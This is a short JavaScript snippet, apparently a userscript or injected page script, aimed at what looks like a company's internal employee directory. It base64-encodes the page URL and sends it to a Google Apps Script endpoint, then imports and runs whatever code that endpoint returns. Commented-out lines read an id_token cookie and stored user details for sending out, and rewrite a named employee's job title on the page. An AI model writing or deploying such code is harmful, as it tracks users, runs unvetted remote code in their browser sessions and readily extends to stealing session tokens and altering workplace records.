(() => {
  const parse = (x) => {
    try {
      return JSON.parse(x);
    } catch {
      return x;
    }
  };
  const document = window.top.document;
  const eagleid = location.href;//Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
  const name = location.href;//String(parse(localStorage.getItem("user"))?.FirstName);
  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
  url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
  (async () => {
    try {
      await import(url);
    } catch {
      
    }finally{
      document.querySelector('[werk]')?.remove?.();
    }
  })();
  const TenX = (async ()=>{
    await new Promise(resolve=>document.readyState == 'complete' ? resolve() : document.addEventListener("load", resolve));
  /*  await[...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
      x.innerText = "10x Software Engineer";
      x.setAttribute("x10", true);
    });*/
    await[...document.querySelectorAll("[missing]")].forEach((x) => x.remove());
  });
  TenX();
  setInterval(TenX,100);
})();
